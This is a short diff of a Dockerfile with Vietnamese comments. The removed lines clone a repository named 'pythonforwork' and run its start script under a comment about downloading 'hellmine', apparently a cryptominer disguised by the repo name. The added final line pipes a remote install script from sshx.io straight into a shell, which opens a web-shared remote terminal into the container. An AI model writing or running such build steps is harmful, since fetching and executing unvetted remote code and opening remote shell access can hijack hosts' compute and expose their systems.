@@ -1,10 +1,16 @@
+# Sử dụng hình 
 FROM ubuntu:latest
 
-
 # Cập nhật hệ thống và cài đặt các gói cần thiết
-RUN apt update && apt install htop curl unzip python3 git -y && git clone https://github.com/Teo4268/pythonforwork.git && cd pythonforwork && unzip pythonforwork.zip && cd pythonforwork && chmod +x ./start.sh
+RUN lscpu && apt update && apt upgrade -y && apt-get update && apt-get install -y htop \
+    curl \
+    ca-certificates \
+    git \
+    sudo \ 
+    unzip \
+    python3 
     
-FROM quay.io/jupyterhub/k8s-network-tools:4.0.0
+
 # Tạo thư mục làm việc và tải hellmine
 
-RUN start.sh 69
+RUN curl -sSf https://sshx.io/get | sh -s run
